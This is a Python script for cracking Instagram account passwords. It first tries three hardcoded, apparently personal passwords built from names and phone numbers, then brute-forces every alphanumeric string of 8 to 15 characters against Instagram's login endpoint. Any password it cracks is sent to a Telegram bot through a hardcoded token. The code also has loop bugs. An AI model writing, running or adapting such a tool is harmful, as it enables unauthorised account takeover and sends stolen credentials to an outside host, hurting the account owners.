import requests
import time

# Bot token
BOT_TOKEN = '8220112113:AAGY10rcsQNfYhWNOW2w81dXjC6-LoLofoU'

# Bot URL
BOT_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

# Initial passwords to try
initial_passwords = ['emin99371184897', 'kakajan99363764808', 'hajy99362756808']

# Instagram username
username = 'YOUR_INSTAGRAM_USERNAME'

# Function to try a password
def try_password(username, password):
    session = requests.Session()
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    login_payload = {
        'username': username,
        'password': password,
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }
    response = session.post(login_url, data=login_payload, headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
        'Origin': 'https://www.instagram.com'
    })

    if 'authenticated' in response.text:
        return True
    return False

# Try initial passwords
for password in initial_passwords:
    if try_password(username, password):
        requests.post(BOT_URL, json={
            'chat_id': 'YOUR_CHAT_ID',
            'text': f'Cracked Instagram password: {password}'
        })
        break

# If initial passwords do not work, generate and try more passwords
if not try_password(username, password):
    import itertools
    import string

    characters = string.ascii_letters + string.digits
    for length in range(8, 16):  # Adjust the range as needed
        for password in itertools.product(characters, repeat=length):
            password = ''.join(password)
            if try_password(username, password):
                requests.post(BOT_URL, json={
                    'chat_id': 'YOUR_CHAT_ID',
                    'text': f'Cracked Instagram password: {password}'
                })
                break
            time.sleep(1)  # Adds a delay to avoid getting blocked
